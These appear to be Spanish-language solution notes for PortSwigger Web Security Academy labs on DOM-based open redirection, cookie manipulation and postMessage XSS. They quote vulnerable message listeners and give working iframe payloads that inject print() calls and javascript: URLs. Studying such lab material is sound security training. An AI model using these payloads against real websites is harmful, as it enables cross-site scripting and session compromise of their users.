
## Lab: DOM-based open redirection

```
https://0ad300050352fc5b82101a8000920035.web-security-academy.net/post?postId=10&url=https://exploit-0a2900870399fcf082ac194f0111009f.exploit-server.net/exploit
```

## Lab: DOM-based cookie canipulation

```
<iframe src="https://0a810014034119ae81ea93ac00610002.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a810014034119ae81ea93ac00610002.web-security-academy.net/';window.x=1;">
```
##  Lab: DOM XSS using web messages

La página vulnerable recibe un mensaje y lo agrega al DOM: 
```
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

Por ende en el servidor de explotación se carga el siguiente <iframe>
```
<iframe src="//0a6100b1046892ff805c03d500a200c6.web-security-academy.net" onload="this.contentWindow.postMessage('<img src=1 onerror=print(1)>','*')">
```

## Lab: DOM XSS using web messages and a JavaScript URL 

Nos encontramos con el codigo vulnerable en la página: 
```
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

Como solo valida que este presente en la URL `http` o `https` pero no en que parte generamos el siguiente payload: 
```
i<iframe src="https://0aae000b03be513d806e12b400060061.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

## Lab: DOM XSS using web messages and JSON.parse
 

Código de la página, que tiene un listener que esta esperando una cadena de JSON, revisando vemos que si el atributo type entra en el case "load-channel" podemos modificar la src del iframe que esta cargando la página legitima: 
```
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```

Exploit 
```
<iframe src=https://0a98004b04bf9ab480731299009200df.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
